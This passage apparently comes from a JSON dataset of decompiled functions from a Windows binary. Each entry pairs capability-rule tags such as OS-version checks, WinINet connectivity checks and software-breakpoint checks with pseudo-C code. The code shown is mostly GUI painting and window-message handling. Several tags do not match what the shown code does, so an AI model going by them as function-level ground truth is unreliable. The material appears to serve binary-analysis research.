  iStack80 = fcn.00411ed0(*0x4319f8, 0x67c7, uStack12);\n    pcVar1 = _sym.imp.GDI32.dll_CreateSolidBrush;\n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 + 1;\n        uVar2 = (*pcVar1)(*(&stack0xffffffc0 + uVar3 * 4));\n        *(&stack0xffffffb4 + uVar3 * 4) = uVar2;\n        uVar3 = uVar5;\n    } while (uVar5 < 3);\n    uVar5 = 0;\n    do {\n        if (*(&stack0xffffffb4 + uVar5 * 4) == 0) goto code_r0x0040fdf8;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 3);\n    if (iStack80 != 0) {\n        fcn.0040ec00();\n        *0x431a24 = aiStack76[0];\n        *0x431a28 = aiStack76[1];\n        *0x431a2c = aiStack76[2];\n        puVar7 = &stack0xffffffc0;\n        puVar9 = 0x431a04;\n        for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *0x431a30 = iStack80;\n        return 1;\n    }\ncode_r0x0040fdf8:\n    uVar5 = 0;\n    do {\n        uVar3 = uVar5;\n        uVar5 = uVar5 + 1;\n        fcn.0040ebe0(&stack0xffffffb4 + uVar3 * 4);\n    } while (uVar5 < 3);\n    fcn.0040ebe0(&stack0xffffffb0);\n    return 0;\n}\n",
        "token_count": 1056
    },
    "00410530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00410530(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint16_t *puVar5;\n    uint32_t unaff_EDI;\n    uchar auStack16 [8];\n    uint16_t uStack8;\n    uint32_t uStack4;\n    \n    iVar2 = fcn.0040e930(param_1);\n    if (iVar2 != 0) {\n        return false;\n    }\n    iVar2 = 0;\n    puVar5 = 0x41eeec;\n    (*_sym.imp.USER32.dll_GetClassNameA)(param_1, auStack16, 0x10);\n    uVar1 = uStack4 & 0xffff;\n    do {\n        if ((*puVar5 & uVar1) != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(puVar5 + -0xe, &stack0xffffffe4);\n            if (iVar3 == 0) {\n                uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff0);\n                iVar3 = (**(iVar2 * 0x20 + 0x41eee8))\n                                  (param_1, uVar4, unaff_EDI & 0xffff0000 | uVar1, puVar5 & 0xffff0000 | uStack8, \n                                   uStack4);\n                if (iVar3 == 1) {\n                    if ((uStack8 == 1) && (*0x431a02 == 0x10)) {\n                        fcn.0040eb40(param_1, *(iVar2 * 0x18 + 0x432440));\n                        return true;\n                    }\n                    fcn.0040e9a0(param_1, *(iVar2 * 0x18 + 0x432440));\n                }\n                return iVar3 != 0;\n            }\n        }\n        puVar5 = puVar5 + 0x10;\n        iVar2 = iVar2 + 1;\n        if (0x41efab < puVar5) {\n            return false;\n        }\n    } while( true );\n}\n",
        "token_count": 487
    },
    "00410750": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00410750(uint param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack260;\n    uchar *puStack256;\n    uchar *puStack252;\n    uchar *puStack248;\n    int32_t iStack244;\n    int32_t iStack240;\n    int32_t iStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    int32_t iStack224;\n    uchar *puStack220;\n    int32_t iStack216;\n    int32_t iStack212;\n    int32_t iStack208;\n    int32_t iStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    int32_t iStack172;\n    int32_t iStack168;\n    uint uStack164;\n    int32_t iStack160;\n    int32_t iStack156;\n    int32_t iStack152;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint uStack140;\n    int32_t iStack136;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint uStack124;\n    int32_t iStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack28 [12];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack16 = *param_3;\n    uStack12 = param_3[1];\n    uStack8 = param_3[2];\n    uStack48 = 0xf;\n    uStack52 = 7;\n    uStack4 = param_3[3];\n    puStack56 = 0x7;\n    puStack60 = param_3;\n    iStack64 = param_2;\n    puStack68 = 0x410786;\n    fcn.0040ec60();\n    puStack56 = &stack0xfffffff0;\n    uStack48 = 0xffffffff;\n    uStack52 = 0xffffffff;\n    puStack60 = 0x410798;\n    (*_sym.imp.USER32.dll_InflateRect)();\n    if (param_3 == 1) {\n        puStack60 = uStack8;\n        iStack64 = 0x4107ab;\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n        if (iVar1 != 0) {\n            puStack72 = &stack0xffffffe4;\n            puStack60 = 0xf;\n            iStack64 = 7;\n            puStack68 = 0x7;\n            iStack76 = param_2;\n            iStack80 = 0x4107c0;\n            fcn.0040ec60();\n            puStack68 = &stack0xffffffe4;\n            puStack60 = 0xffffffff;\n            iStack64 = 0xffffffff;\n            puStack72 = 0x4107d2;\n            (*_sym.imp.USER32.dll_InflateRect)();\n        }\n    }\n    puStack60 = 0xf00021;\n    puStack72 = param_3[1];\n    iStack64 = 1;\n    iStack76 = *param_3;\n    puStack68 = 0x1;\n    iStack80 = param_2;\n    uStack84 = 0x4107e9;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack84 = 0xf00021;\n    uStack96 = param_3[1];\n    uStack88 = 1;\n    uStack92 = 1;\n    iStack100 = param_3[2] + -1;\n    iStack104 = param_2;\n    uStack108 = 0x410802;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack108 = 0xf00021;\n    uStack112 = 1;\n    iStack120 = param_3[3] + -1;\n    uStack116 = 1;\n    uStack124 = *param_3;\n    iStack128 = param_2;\n    iStack132 = 0x41081a;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack132 = 0xf00021;\n    iStack136 = 1;\n    iStack144 = param_3[3] + -1;\n    uStack140 = 1;\n    iStack148 = param_3[2] + -1;\n    iStack152 = param_2;\n    iStack156 = 0x410834;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    bVar4 = iStack80 == 0;\n    iVar1 = bVar4 + 1;\n    iStack156 = *0x431a24;\n    if (iStack80 != 0) {\n        iStack156 = *0x431a2c;\n    }\n    iStack160 = param_2;\n    uStack164 = 0x410859;\n    iStack144 = (*_sym.imp.GDI32.dll_SelectObject)();\n    uStack164 = 0xf00021;\n    iStack168 = iStack120 - iStack128;\n    iStack176 = iStack128;\n    iStack180 = iStack132;\n    iStack184 = param_2;\n    iStack188 = 0x41087d;\n    iStack172 = iVar1;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack188 = 0xf00021;\n    iStack196 = iStack148 - iStack156;\n    iStack200 = iStack152;\n    iStack204 = iStack156;\n    iStack208 = param_2;\n    iStack212 = 0x41089d;\n    iStack192 = iVar1;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    if (iStack136 == 0) {\n        iVar3 = 0;\n        iStack212 = *0x431a2c;\n        iStack216 = param_2;\n        puStack220 = 0x4108b3;\n        (*_sym.imp.GDI32.dll_SelectObject)();\n        iStack168 = iStack168 + -1;\n        iStack172 = iStack172 + -1;\n        if (iVar1 != 0) {\n            do {\n                iStack212 = 0xf00021;\n                iStack216 = 1;\n                puStack220 = (iStack172 - iStack180) + 1;\n                iStack224 = iStack168;\n                iStack228 = iStack180;\n                iStack232 = param_2;\n                iStack236 = 0x4108e1;\n                (*_sym.imp.GDI32.dll_PatBlt)();\n                iStack236 = 0xf00021;\n                iStack240 = iStack192 - iStack200;\n                iStack244 = 1;\n                puStack248 = iStack200;\n                puStack252 = iStack196;\n                puStack256 = param_2;\n                iStack260 = 0x410902;\n                (*_sym.imp.GDI32.dll_PatBlt)();\n                if (iVar3 < bVar4) {\n                    puStack220 = &stack0xffffff4c;\n                    iStack212 = 0xffffffff;\n                    iStack216 = 0xffffffff;\n                    iStack224 = 0x410918;\n                    (*_sym.imp.USER32.dll_InflateRect)();\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < iVar1);\n        }\n    }\n    iStack180 = iStack180 + 1;\n    iStack176 = iStack176 + 1;\n    iStack212 = *0x431a28;\n    iStack216 = param_2;\n    puStack220 = 0x410932;\n    (*_sym.imp.GDI32.dll_SelectObject)();\n    puStack220 = 0xf00021;\n    iStack224 = iStack176 - iStack184;\n    iStack228 = iStack180 - iStack188;\n    iStack232 = iStack184;\n    iStack236 = iStack188;\n    iStack240 = param_2;\n    iStack244 = 0x41095a;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack244 = iStack192;\n    puStack248 = 0x410965;\n    iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n    if (iVar1 == 0) {\n        puStack248 = *0x431a1c;\n        puStack252 = param_2;\n        puStack256 = 0x410976;\n        (*_sym.imp.GDI32.dll_SetTextColor)();\n    }\n    iVar1 = iStack184;\n    puStack248 = &stack0xffffff24;\n    puStack252 = &stack0xffffff20;\n    puStack256 = iStack184;\n    iStack260 = param_2;\n    fcn.0040ee50();\n    iStack212 = iStack212 + ((iStack204 - iStack212) - puStack220) / 2;\n    iStack216 = iStack216 + ((iStack208 - iStack216) - iStack224) / 2;\n    iVar3 = iStack212 + puStack220;\n    if (iStack204 <= iStack212 + puStack220) {\n        iVar3 = iStack204;\n    }\n    iVar2 = iStack216 + iStack224;\n    if (iStack208 <= iStack216 + iStack224) {\n        iVar2 = iStack208;\n    }\n    iStack208 = iVar2;\n    if (iStack172 != 0) {\n        puStack256 = &stack0xffffff28;\n        puStack248 = 0x1;\n        puStack252 = 0x1;\n        iStack260 = 0x4109fe;\n        iStack204 = iVar3;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n        iVar3 = param_3[2] + -3;\n        if (iStack208 <= param_3[2] + -3) {\n            iVar3 = iStack208;\n        }\n        iStack208 = iVar3;\n        iVar3 = param_3[3] + -3;\n        if (iStack204 <= param_3[3] + -3) {\n            iVar3 = iStack204;\n        }\n    }\n    iStack204 = iVar3;\n    puStack252 = &stack0xffffff28;\n    puStack248 = 0x20;\n    puStack256 = iStack180;\n    iStack260 = iVar1;\n    (*_sym.imp.USER32.dll_DrawTextA)(param_2);\n    iVar1 = (*_sym.imp.USER32.dll_GetFocus)();\n    if (iVar1 == iStack216) {\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xffffff14, 1, 1);\n        (*_sym.imp.USER32.dll_IntersectRect)(&stack0xffffff08, &stack0xffffff08, param_3);\n        (*_sym.imp.USER32.dll_DrawFocusRect)(param_2, &stack0xfffffefc);\n    }\n    if (puStack248 != NULL) {\n        (*_sym.imp.GDI32.dll_SelectObject)(param_2, puStack248);\n    }\n    return;\n}\n",
        "token_count": 2631
    },
    "00410a90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00410a90(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack460;\n    int32_t iStack456;\n    int32_t iStack452;\n    int32_t iStack448;\n    int32_t iStack444;\n    uint32_t uStack440;\n    int32_t iStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    int32_t iStack424;\n    int32_t iStack420;\n    int32_t iStack416;\n    int32_t iStack412;\n    int32_t iStack408;\n    uint32_t uStack404;\n    int32_t iStack400;\n    int32_t iStack396;\n    int32_t iStack392;\n    int32_t iStack388;\n    int32_t iStack384;\n    uchar *puStack380;\n    int32_t iStack376;\n    uint uStack372;\n    int32_t iStack368;\n    int32_t iStack364;\n    uint uStack360;\n    uchar auStack308 [208];\n    uint32_t uStack100;\n    int32_t iStack4;\n    \n    uStack360 = 0xfffffff0;\n    iStack364 = param_1;\n    iStack368 = 0x410aaa;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    iStack368 = param_1;\n    uVar2 = uVar2 & 0x1f;\n    uStack372 = 0x410abf;\n    (*_sym.imp.USER32.dll_GetParent)();\n    uStack372 = 2;\n    iStack376 = iStack4;\n    puStack380 = 0x410ad3;\n    (*_sym.imp.GDI32.dll_SetBkMode)();\n    puStack380 = &stack0xfffffecc;\n    iStack384 = param_1;\n    iStack388 = 0x410ae1;\n    (*_sym.imp.USER32.dll_GetClientRect)();\n    iStack388 = 0;\n    iStack392 = 0;\n    iStack396 = 0x31;\n    iStack400 = param_1;\n    uStack404 = 0x410b0d;\n    uStack404 = (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack384 = uStack404;\n    if (uStack404 != 0) {\n        iStack408 = iStack4;\n        iStack412 = 0x410b1d;\n        iStack384 = (*_sym.imp.GDI32.dll_SelectObject)();\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    uStack404 = 0xf;\n    iStack408 = 0x410b2b;\n    iStack408 = (*_sym.imp.USER32.dll_GetSysColor)();\n    iStack412 = iStack4;\n    iStack416 = 0x410b33;\n    (*_sym.imp.GDI32.dll_SetBkColor)();\n    iStack416 = 0x12;\n    iStack420 = 0x410b37;\n    iStack420 = (*pcVar1)();\n    iStack424 = iStack4;\n    iStack428 = 0x410b3f;\n    (*_sym.imp.GDI32.dll_SetTextColor)();\n    iStack428 = param_1;\n    iStack432 = iStack4;\n    iStack436 = 0x135;\n    uStack440 = iStack396;\n    iStack444 = 0x410b51;\n    iStack444 = (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack448 = iStack4;\n    iStack452 = 0x410b59;\n    uStack404 = (*_sym.imp.GDI32.dll_SelectObject)();\n    iStack452 = iStack384;\n    iStack456 = iStack388;\n    iStack460 = iStack392;\n    (*_sym.imp.GDI32.dll_IntersectClipRect)(iStack4, iStack396);\n    if (((uStack100 & 0x10) != 0) && (uVar2 != 7)) {\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (iStack4, iStack416, iStack412, iStack408 - iStack416, uStack404 - iStack412, 0xf00021);\n    }\n    iVar10 = param_1;\n    iStack432 = (*_sym.imp.USER32.dll_IsWindowEnabled)(param_1);\n    uVar9 = 0;\n    iVar8 = 0;\n    uVar7 = 0xf2;\n    uStack404 = (*_sym.imp.USER32.dll_SendMessageA)(param_1, 0xf2, 0, 0);\n    iVar11 = 0;\n    uStack440 = uStack404 & 3;\n    uStack404 = uStack404 & 4;\n    if ((((uStack100 & 10) != 0) || (uVar2 == 0)) || (uVar2 == 1)) {\n        iStack452 = (*_sym.imp.USER32.dll_GetWindowTextA)(param_1, &stack0xfffffe7c, 0x100);\n    }\n    // switch table (10 cases) at 0x410fb4\n    switch(uVar2) {\n    case 0:\n    case 1:\n        fcn.00410750(param_1, iStack4, &stack0xfffffe5c, &stack0xfffffe7c, iStack452, uVar2, uStack404);\n        goto code_r0x00410f89;\n    case 2:\n    case 3:\n        break;\n    case 4:\n    case 9:\n        iVar11 = 0xd;\n        break;\n    case 5:\n    case 6:\n        if (uStack440 == 2) {\n            iVar11 = 0x1a;\n        }\n        break;\n    case 7:\n        if ((uStack100 & 6) != 0) {\n            fcn.0040ee50(iStack4, &stack0xfffffe7c, &stack0xfffffe48, &stack0xfffffe38);\n            if (iStack456 == 0) {\n                fcn.0040ee50(iStack4, 0x42da84, &stack0xfffffe6c, &stack0xfffffe38);\n            }\n            pcVar1 = _sym.imp.USER32.dll_ClientToScreen;\n            iStack436 = iStack436 + 4;\n            iStack428 = uStack440 + iStack436 + 4;\n            iStack424 = iStack456 + iStack432;\n            if ((uStack100 & 0x20) != 0) {\n                puVar6 = &stack0xfffffe6c;\n                iStack400 = iStack432;\n                iStack396 = iStack412;\n                uStack404 = iStack436;\n                iStack392 = iStack424;\n                (*_sym.imp.USER32.dll_ClientToScreen)(param_1, puVar6);\n                (*pcVar1)(param_1, &stack0xfffffe6c);\n                pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n                (*_sym.imp.USER32.dll_ScreenToClient)(uVar9, &stack0xfffffe5c);\n                (*pcVar1)(uVar7, &stack0xfffffe5c);\n                (*_sym.imp.USER32.dll_InvalidateRect)(puVar6, &stack0xfffffe4c, 1);\n                return;\n            }\n            iStack412 = iStack412 + -1;\n            iStack408 = iStack408 + -1;\n            iStack416 = iStack416 + iStack456 / 2;\n            fcn.0040ec60(iStack4, &stack0xfffffe5c, 2, 2, 0xf);\n            (*_sym.imp.USER32.dll_OffsetRect)(&stack0xfffffe5c, 1, 1);\n            fcn.0040ec60(iStack4, &stack0xfffffe50, 0, 0, 0xf);\n            if (iStack460 == 0) {\n                (*_sym.imp.GDI32.dll_SetTextColor)(iStack4, *0x431a1c);\n            }\n            (*_sym.imp.USER32.dll_DrawTextA)(iStack4, &stack0xfffffe70, iVar11, &stack0xfffffe40, 0x20);\n        }\n    default:\n        goto code_r0x00410f89;\n    }\n    if (((uStack100 & 4) != 0) && (iVar3 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(iStack4),  iVar3 != 0)) {\n        iVar4 = (*_sym.imp.GDI32.dll_SelectObject)(iVar3, *0x431a30);\n        if (iVar4 != 0) {\n            iVar5 = iStack444;\n            if (iVar11 != 0) {\n                iVar5 = iStack436 + -0xe;\n            }\n            (*_sym.imp.GDI32.dll_BitBlt)\n                      (iStack4, iVar5, uStack440 + ((iStack432 - uStack440) + -0xd) / 2, 0xe, 0xd, iVar3, uVar9, iVar10\n                       , 0xcc0020);\n            (*_sym.imp.GDI32.dll_SelectObject)(iVar3, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_DeleteDC)(iVar3);\n    }\n    if ((uStack100 & 2) != 0) {\n        if (iStack456 == 0) {\n            iStack436 = iStack420 + 0x12;\n        }\n        else {\n            iStack428 = iStack412 + -0x12;\n        }\n        if (iStack448 == 0) {\n            (*_sym.imp.GDI32.dll_SetTextColor)(iStack4, *0x431a1c);\n        }\n        (*_sym.imp.USER32.dll_DrawTextA)(iStack4, &stack0xfffffe7c, iStack452, &stack0xfffffe4c, 0x24);\n    }\n    if ((uStack100 & 8) != 0) {\n        fcn.0040ee50(iStack4, &stack0xfffffe7c, &stack0xfffffe6c, &stack0xfffffe48);\n        iStack432 = ((iStack424 - iStack432) - uStack440) / 2;\n        iStack424 = uStack440 + iStack432;\n        if (iStack456 == 0) {\n            iStack436 = iStack420 + 0x12;\n        }\n        else {\n            iStack412 = iStack412 + -0x12;\n            iStack436 = iStack420;\n        }\n        iStack428 = uStack404 + iStack436;\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xfffffe4c, 1, 1);\n        (*_sym.imp.USER32.dll_IntersectRect)(&stack0xfffffe40, &stack0xfffffe40, &stack0xfffffe50);\n        (*_sym.imp.USER32.dll_DrawFocusRect)(iStack4, &stack0xfffffe34);\n    }\ncode_r0x00410f89:\n    (*_sym.imp.GDI32.dll_SelectObject)(iStack4, iStack444);\n    if (iVar8 != 0) {\n        (*_sym.imp.GDI32.dll_SelectObject)(iStack4, iVar8);\n    }\n    return;\n}\n",
        "token_count": 2580
    },
    "004112c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004112c0(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t unaff_EDI;\n    int32_t unaff_retaddr;\n    uint uVar8;\n    int32_t iStack124;\n    int32_t iStack120;\n    uchar *puStack116;\n    int32_t iStack112;\n    uchar *puStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uchar auStack68 [4];\n    uint32_t uStack64;\n    uchar auStack56 [8];\n    int32_t iStack48;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iStack88 = -0x10;\n    uStack92 = param_1;\n    puStack96 = 0x4112d4;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((uVar2 & 0x10000000) != 0) {\n        if ((param_1 == 3) && ((uVar2 & 3) == 3)) {\n            puStack96 = NULL;\n            iStack100 = 0;\n            iStack104 = 0x157;\n            puStack108 = param_1;\n            iStack112 = 0x411300;\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)();\n            if (iVar3 != 0) {\n                return;\n            }\n        }\n        if (unaff_retaddr != 0) {\n            puStack96 = param_1;\n            iStack100 = 0x411316;\n            (*_sym.imp.USER32.dll_HideCaret)();\n        }\n        puStack96 = &stack0xffffffc8;\n        iStack100 = param_1;\n        iStack104 = 0x411322;\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        iStack104 = param_1;\n        puStack108 = 0x411329;\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)();\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        puStack108 = &stack0xffffffbc;\n        puStack116 = 0x411339;\n        iStack112 = iVar3;\n        (*_sym.imp.USER32.dll_ScreenToClient)();\n        puStack116 = &stack0xffffffbc;\n        uVar2 = 0xf;\n        iStack124 = 0x411345;\n        iStack120 = iVar3;\n        (*pcVar1)();\n        iStack124 = iVar3;\n        uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n        puStack96 = puStack108 & 0x100000;\n        if (puStack96 != NULL) {\n            uVar2 = 7;\n        }\n        uStack92 = puStack108 & 0x200000;\n        if (uStack92 != 0) {\n            uVar2 = uVar2 & 0xfffffffb;\n        }\n        iVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff4);\n        if (iStack40 - iVar5 == -1000) {\n            puStack108 = 0x29a;\n            puStack96 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x1944, 0, &stack0xffffff94);\n            if (iStack124 == 0x29a) {\n                puStack96 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x1943, 0, &stack0xffffff84);\n            }\n            (*_sym.imp.USER32.dll_GetClassNameA)(iVar3, &stack0xffffffb0, 0x10);\n            iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&stack0xffffffa4, \"ComboBox\");\n            if ((iVar5 == 0) || ((puStack108 == 0x1 && (unaff_EDI == 0x3eb)))) {\n                puStack116 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n                uVar8 = 2;\n                (*_sym.imp.USER32.dll_MapWindowPoints)(iVar3, puStack116, &stack0xffffff9c, 2);\n                (*_sym.imp.USER32.dll_ReleaseDC)(iVar3, uVar4);\n                uVar4 = (*_sym.imp.USER32.dll_GetDC)(uVar8);\n                if (iStack40 == 0) {\n                    uVar2 = uVar2 & 0xfffffffd;\n                    uStack92 = uStack92 + 1;\n                    iVar3 = iStack112;\n                }\n                else {\n                    uVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n                    if (((uVar6 & 3) == 2) || ((uVar6 & 3) == 3)) {\n                        iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x157, 0, 0);\n                        iVar3 = iStack112;\n                        if (iVar5 != 0) {\n                            (*_sym.imp.USER32.dll_ReleaseDC)(iStack112, uVar4);\n                            (*_sym.imp.USER32.dll_ShowCaret)(param_1);\n                            return;\n                        }\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xfffffff7;\n                        uVar8 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 5);\n                        (*_sym.imp.USER32.dll_GetWindowRect)(uVar8, &stack0xffffffa0);\n                        iStack88 = iStack88 + (unaff_EDI - unaff_EBX);\n                        fcn.0040eda0(uVar4, &stack0xffffffa0, 0x1008);\n                        iStack88 = iStack88 + (unaff_EBX - unaff_EDI);\n                        iVar3 = iStack112;\n                    }\n                }\n            }\n        }\n        fcn.0040eda0(uVar4, &stack0xffffffa0, uVar2);\n        iVar5 = iStack88;\n        if ((iStack36 == 3) && ((puStack116 & 3) == 3)) {\n            iVar7 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n            puStack96 = iVar5 - iVar7;\n            fcn.0040ec60(uVar4, &stack0xffffffa0, 7, 7, 0xc);\n            fcn.004106e0(param_1);\n        }\n        else {\n            if (iStack100 != 0) {\n                iStack88 = iStack88 + 1;\n                fcn.0040ec60(uVar4, &stack0xffffffa0, 0, 0, 4);\n                iVar5 = iStack88 + -1;\n                uStack64 = puStack96;\n                iStack88 = iVar5;\n                iVar7 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n                puStack96 = iVar5 - iVar7;\n                fcn.0040ec60(uVar4, &stack0xffffffa0, 7, 7, 8);\n                puStack96 = uStack64;\n            }\n            if (iStack104 != 0) {\n                unaff_EBP = unaff_EBP + 1;\n                fcn.0040ec60(uVar4, &stack0xffffffa0, 0, 0, 8);\n                iVar5 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x15);\n                uStack92 = (unaff_EBP + -1) - iVar5;\n                fcn.0040ec60(uVar4, &stack0xffffffa0, 7, 7, 4);\n            }\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(iVar3, uVar4);\n        if (iStack48 != 0) {\n            (*_sym.imp.USER32.dll_ShowCaret)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1833
    },
    "00411a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.00411a30(uint noname_0, uint noname_1, int32_t *noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint hWnd, uint hdc, \n            uint nXLeft)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    uint var_ch;\n    uint32_t var_14h_2;\n    uint var_4h;\n    uint uStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uint var_14h;\n    uint crColor;\n    uint lpchText;\n    \n    uStack28 = 0xf00021;\n    iStack40 = noname_2[1];\n    iStack44 = *noname_2;\n    iStack32 = noname_2[3] - iStack40;\n    iStack36 = noname_2[2] - iStack44;\n    uStack48 = var_ch;\n    uStack52 = 0x411a5e;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack52 = noname_0;\n    iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)();\n    fcn.004080e0();\n    if (*0x10 != 0x34) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(noname_0, &stack0xffffffcc, iVar1 + 2);\n        if (iVar1 != 0) {\n            uVar2 = 0x140;\n            if ((var_14h_2 & 0xf) != 0xc) {\n                uVar2 = var_14h_2 & 0xf | 0x150;\n            }\n            if ((var_14h_2 & 0x80) != 0) {\n                uVar2 = uVar2 | 0x800;\n            }\n            if ((var_14h_2 & 0x8000000) != 0) {\n                crColor = (*_sym.imp.GDI32.dll_SetTextColor)(var_ch, *0x431a1c);\n            }\n            (*_sym.imp.USER32.dll_DrawTextA)(var_ch, &stack0xffffffcc, 0xffffffff, noname_2, uVar2);\n            if ((var_14h_2 & 0x8000000) != 0) {\n                (*_sym.imp.GDI32.dll_SetTextColor)(var_ch, crColor);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 641
    },
    "00411e00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
